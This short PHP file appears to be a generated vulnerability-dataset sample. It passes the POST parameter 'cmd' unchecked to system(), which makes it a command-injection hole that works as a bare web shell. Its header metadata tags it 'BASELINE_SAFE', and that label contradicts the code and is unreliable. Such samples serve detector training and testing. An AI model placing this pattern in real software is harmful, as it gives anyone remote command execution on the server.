<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=FILTER_INPUT_POST; SKELETON=S0; KEY=cmd; SINK=B1; VAR=v0057 */
function SINK_B1($command){
    system($command);
}
$inp = (string)(filter_input(INPUT_POST, "cmd") ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B1($inp);
echo (string)($out);
?>
